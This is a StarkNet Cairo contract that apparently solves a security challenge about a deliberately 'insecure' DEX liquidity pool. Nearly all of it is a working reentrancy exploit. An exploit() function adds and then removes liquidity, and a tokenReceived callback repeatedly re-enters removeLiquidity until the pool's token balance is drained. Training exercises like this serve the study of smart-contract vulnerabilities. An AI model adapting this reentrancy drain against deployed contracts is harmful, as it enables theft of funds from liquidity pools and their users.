%lang starknet
from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.bool import FALSE, TRUE
from starkware.starknet.common.syscalls import deploy,get_contract_address
from starkware.cairo.common.uint256 import (Uint256,uint256_eq)
from starkware.cairo.common.alloc import alloc
from openzeppelin.token.erc20.IERC20 import IERC20

@event
func balance(balance: Uint256) {
}
// ######## Constants

const TOKEN_1=1*10**18;
const TOKEN_10=10*10**18;
const TOKEN_100=100*10**18;
const dex_address=0x41bfabfdacebc2a3a2f0d39459131a06add79aaa5a5d58640d531283d7a6b57;
const isec_address=0x7ea4f7f50d9b612614e3bdd8246a6b5f9bc7aeafcd5bdaf511c5a3569da06c4;
const iset_address=0x3378f7d27dd17b9accd75f9f0bfb8387e5d2376d6a715ed16661ef9c9afd4a6;

// ######## Interfaces

@contract_interface
namespace IInsecureDexLP {
    func addLiquidity(amount0 : Uint256,amount1 : Uint256) -> (liquidity : Uint256){
    }

    func balanceOf(user : felt) -> (output : Uint256){
    }

    func removeLiquidity(amount : Uint256) -> (amount0 : Uint256,amount1 : Uint256){
    }
}

@external
func exploit{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(){
    //Add liquidity (10ISEC and 10SET)
    IERC20.approve(contract_address = isec_address,
                   spender = dex_address,
                   amount = Uint256(TOKEN_1,0));
    IERC20.approve(contract_address = iset_address,
                   spender = dex_address,
                   amount = Uint256(TOKEN_1,0));
    IInsecureDexLP.addLiquidity(contract_address = dex_address, 
                                amount0 = Uint256(TOKEN_1,0),
                                amount1 = Uint256(TOKEN_1,0));

    IInsecureDexLP.removeLiquidity(contract_address=dex_address,amount=Uint256(TOKEN_1,0));

    return();
}

// To receive ERC223 tokens
@external
func tokenReceived{syscall_ptr: felt*, pedersen_ptr: HashBuiltin*, range_check_ptr}(
    address : felt, 
    amount : Uint256, 
    calldata_len : felt, 
    calldata : felt*){
         alloc_locals;
         if (address==dex_address){
             let (dex_balance:Uint256)=IERC20.balanceOf(contract_address=isec_address,account=address); 
             let(is_eq)=uint256_eq(dex_balance,Uint256(0,0));
             balance.emit(
                balance=dex_balance
             );
             if (is_eq==FALSE){
                 IInsecureDexLP.removeLiquidity(contract_address=dex_address,amount=amount);
                 return();
             }
             return();
         }
         return();
}
